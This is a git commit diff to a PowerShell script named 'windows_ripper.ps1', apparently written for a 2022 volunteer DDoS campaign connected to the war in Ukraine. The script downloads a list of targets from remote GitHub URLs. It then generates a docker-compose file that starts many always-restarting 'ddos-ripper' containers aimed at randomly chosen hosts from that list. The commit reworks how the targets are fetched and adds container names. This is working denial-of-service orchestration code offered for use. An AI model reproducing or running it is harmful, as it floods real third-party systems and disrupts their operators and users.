1468966907aac5236933e111131f1d1e1a0c9a44
SaharaLacey <100581737+SaharaLacey@users.noreply.github.com>
2022-02-28 15:29:53 +0200

    fix

--- windows_ripper.ps1
+++ windows_ripper.ps1
@@ -1,6 +1,6 @@
 param ($Action, $Number=10, $Force=$false)
 # Stop script if fail by default
-$ErrorActionPreference = "Stop"
+# $ErrorActionPreference = "Stop"
 # Ripper shell v2.1
 # 1.0 - initial script (uses local urls.txt file)
 # 2.0 - added external mirror for url list
@@ -10,7 +10,7 @@ $ErrorActionPreference = "Stop"
 $VERSION = '2.1'
 $TARGETS_URL = 'https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
 $TARGETS_URL_BACKUP = 'https://raw.githubusercontent.com/nitupkcuf/ripper-wrapper/main/targets.json'
-
+$URLS
 
 function Print-Help {
     Write-Host "Usage: wibdows_ripper.sh -Action install [-Number 10]"
@@ -35,18 +35,26 @@ function Check-Dependencies {
 }
 
 
-function Get-Targets {
-    $Result = Invoke-WebRequest -Uri $TARGETS_URL -OutFile targets.txt
-    if ( $Result ) {
-        $URLS =  Get-Content targets.txt
-    } else {
-        Invoke-WebRequest -Uri $TARGETS_URL_BACKUP -OutFile targets.json
-        $URLS =  Get-Content targets.JSON | ConvertFrom-Json
-    }
-}
-
-
 function Generate-Compose {
+    # URLS
+    $HTTP_Request = [System.Net.WebRequest]::Create($TARGETS_URL)
+    $HTTP_Response = $HTTP_Request.GetResponse()
+    $HTTP_Status = [int]$HTTP_Response.StatusCode
+    If ($HTTP_Response) {
+        $HTTP_Response.Close()
+    }
+
+    If ($HTTP_Status -eq 200) {
+        echo "111"
+        Invoke-WebRequest -Uri $TARGETS_URL -OutFile targets.txt
+        $URLS = Get-Content targets.txt
+    }
+    Else {
+        Invoke-WebRequest -Uri $TARGETS_URL_BACKUP -OutFile targets.json
+        $URLS = Get-Content targets.json | ConvertFrom-Json
+    }
+
+    # docker-compose.yml
     Remove-Item -Path docker-compose.yml
     Add-Content -Path docker-compose.yml -Value "version: '3'"
     Add-Content -Path docker-compose.yml -Value "services:"
@@ -54,6 +62,7 @@ function Generate-Compose {
         $LineID = Get-Random -Maximum $URLS.Length
         $Line = $URLS[$LineID]
         Add-Content -Path docker-compose.yml -Value "  ddos-runner-${i}:"
+        Add-Content -Path docker-compose.yml -Value "    container_name: ${i}-$($Line -replace '[\W]', '.' )"
         Add-Content -Path docker-compose.yml -Value "    image: nitupkcuf/ddos-ripper:latest"
         Add-Content -Path docker-compose.yml -Value "    restart: always"
         Add-Content -Path docker-compose.yml -Value "    command: ${Line}"
@@ -89,7 +98,6 @@ if ( -not $Action ) {
     exit 0
 } elseif ( $Action -eq "install" ) {
     Ripper-Stop
-    Get-Targets
     Generate-Compose
     Ripper-Start
     exit 0
